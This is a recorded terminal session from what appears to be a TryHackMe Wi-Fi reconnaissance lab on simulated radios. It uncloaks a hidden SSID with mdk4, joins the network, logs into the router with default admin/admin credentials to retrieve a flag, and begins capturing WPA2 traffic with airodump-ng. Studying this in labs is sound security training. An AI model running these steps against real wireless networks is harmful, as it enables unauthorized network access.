@@ -1,0 +1,536 @@
+Script started on 2026-09-26 16:29:25+03:00 [COMMAND="ssh user@wi.fi.fundamentals.and.reconnaissance.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+The authenticity of host 'wi.fi.fundamentals.and.reconnaissance.thm (10.81.132.106)' can't be established.
+ED25519 key fingerprint is: SHA256:m2JSapMMLDv3k+kNcel3I4huPjOnMu/abJlgZ9H46c0
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'wi.fi.fundamentals.and.reconnaissance.thm' (ED25519) to the list of known hosts.
+user@wi.fi.fundamentals.and.reconnaissance.thm's password: 
+Linux ip-10-81-132-106 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Sep 22 10:08:29 2026 from 192.168.128.181
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo iw dev wlan0mon set channel 11[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo iw dev wlan0mon set channel 11
+[?2004lcommand failed: No such device (-19)
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo airmon-ng check[27msudo airmon-ng check
+[?2004l
+Found 5 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    494 dhclient
+    608 avahi-daemon
+    625 avahi-daemon
+    664 NetworkManager
+    671 wpa_supplicant
+
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo airmon-ng check kill[27msudo airmon-ng check kill
+[?2004l
+Killing these processes:
+
+    PID Name
+    494 dhclient
+    671 wpa_supplicant
+
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo airmon-ng start wlan0[27msudo airmon-ng start wlan0
+[?2004l
+
+PHY	Interface	Driver		Chipset
+
+phy2	wlan0		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
+		(mac80211 station mode vif disabled for [phy2]wlan0)
+phy3	wlan1		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy4	wlan2		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy5	wlan3		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy6	wlan4		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy7	wlan5		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy62	wlan60		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy63	wlan61		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy64	wlan62		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy65	wlan63		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo iw dev[27msudo iw dev
+[?2004lphy#65
+	Interface wlan63
+		ifindex 70
+		wdev 0x4100000001
+		addr 02:00:00:00:3f:00
+		type managed
+		txpower 20.00 dBm
+phy#64
+	Interface wlan62
+		ifindex 69
+		wdev 0x4000000001
+		addr 02:00:00:00:3e:00
+		type managed
+		txpower 20.00 dBm
+phy#63
+	Interface wlan61
+		ifindex 68
+		wdev 0x3f00000001
+		addr 02:00:00:00:3d:00
+		type managed
+		txpower 20.00 dBm
+phy#62
+	Interface wlan60
+		ifindex 67
+		wdev 0x3e00000001
+		addr 02:00:00:00:3c:00
+		type managed
+		txpower 20.00 dBm
+phy#7
+	Interface wlan5
+		ifindex 12
+		wdev 0x700000001
+		addr 02:00:00:00:05:00
+		type managed
+		txpower 20.00 dBm
+phy#6
+	Interface wlan4
+		ifindex 11
+		wdev 0x600000001
+		addr 02:00:00:00:04:00
+		type managed
+		txpower 20.00 dBm
+phy#5
+	Interface wlan3
+		ifindex 10
+		wdev 0x500000001
+		addr 02:00:00:00:03:00
+		type managed
+		txpower 20.00 dBm
+phy#4
+	Interface wlan2
+		ifindex 9
+		wdev 0x400000001
+		addr 02:00:00:00:02:00
+		type managed
+		txpower 20.00 dBm
+phy#3
+	Interface wlan1
+		ifindex 8
+		wdev 0x300000001
+		addr 02:00:00:00:01:00
+		type managed
+		txpower 20.00 dBm
+phy#2
+	Interface wlan0mon
+		ifindex 76
+		wdev 0x200000003
+		addr 02:00:00:00:00:00
+		type monitor
+		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+		txpower 20.00 dBm
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo iw dev wlan0mon set channel 11[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo iw dev wlan0mon set channel 11
+[?2004l[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f /home/user/wordlists/ssid-names.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f /home/user/wordlists/ssid-names.txt
+[?2004lWaiting for a beacon frame from target to get its SSID length.
+SSID length is 9
+Trying SSID: Employees                                           
+Packets sent:      1 - Speed:    1 packets/sec
+Probe Response from target AP with SSID Staff-Net                
+Job's done, have a nice day :)
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7mcat > staff.conf <<EOF[27m
+[7mnetwork={[27m
+[7m    ssid="Staff-Net"[27m
+[7m    scan_ssid=1[27m
+[7m    key_mgmt=NONE[27m
+[7m}[27m
+[7mEOF[27m[A[A[A[A[A[A]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ cat > staff.conf <<EOF
+network={
+    ssid="Staff-Net"
+    scan_ssid=1
+    key_mgmt=NONE
+}
+EOF
+[?2004l[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo wpa_supplicant -B -i wlan1 -c staff.conf[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo wpa_supplicant -B -i wlan1 -c staff.conf
+[?2004lSuccessfully initialized wpa_supplicant
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo iw dev wlan1 link[27msudo iw dev wlan1 link
+[?2004lConnected to f0:9f:c2:6a:88:26 (on wlan1)
+	SSID: Staff-Net
+	freq: 2462
+	RX: 1123 bytes (23 packets)
+	TX: 442 bytes (5 packets)
+	signal: -30 dBm
+	tx bitrate: 6.0 MBit/s
+
+	bss flags:	short-slot-time
+	dtim period:	2
+	beacon int:	100
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo dhclient -v wlan1[27msudo dhclient -v wlan1
+[?2004lInternet Systems Consortium DHCP Client 4.4.3-P1
+Copyright 2004-2022 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan1/02:00:00:00:01:00
+Sending on   LPF/wlan1/02:00:00:00:01:00
+Sending on   Socket/fallback
+DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 7
+DHCPOFFER of 192.168.16.23 from 192.168.16.1
+DHCPREQUEST for 192.168.16.23 on wlan1 to 255.255.255.255 port 67
+DHCPACK of 192.168.16.23 from 192.168.16.1
+bound to 192.168.16.23 -- renewal in 33309 seconds.
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7mip addr show wlan1[27mip addr show wlan1
+[?2004l8: wlan1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.16.23/24 brd 192.168.16.255 scope global wlan1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::ff:fe00:100/64 scope link 
+       valid_lft forever preferred_lft forever
+[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7mcurl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.16.1/lo[27m[7mg[27m[7min.php -o /dev/null[27m[A]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ curl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.16.1/login.php -o /dev/null
+[?2004l[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7mcurl -s -b cookies.txt http://192.168.16.1/index.php[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccurl -s -b cookies.txt http://192.168.16.1/index.php
+[?2004l<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Router Configuration</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<script src="script.js"></script>
+
+<div class="content">
+
+Welcome admin<br><br>Flag: <button onclick="copyFlagToClipboard('THM{0e6521916c3adf08e5b6830f6675351e4eebec92}')">THM{0e6521916c3adf08e5b6830f6675351e4eebec92}</button><br><br>[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ [7msudo airodump-ng --bssid F0:9F:C2:71:22:12 -c 6 -w home2g wlan0mon[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo airodump-ng --bssid F0:9F:C2:71:22:12 -c 6 -w home2g wlan0mon
+[?2004l[0m15:39:44  Created capture file "home2g-01.cap".
+[?25l[2J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       10        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       11        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       11        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       12        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       13        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       13        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       14        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       15        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       15        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       16        4    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        4                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       17        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       17        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       18        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       19        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       19        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       20        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       21        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       22        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       23        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       23        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       24        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       25        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       25        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       26        8    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0        8                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       27       12    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       27       12    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       28       12    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       29       12    0   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       29       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       30       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       31       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       31       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       32       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       33       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       33       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
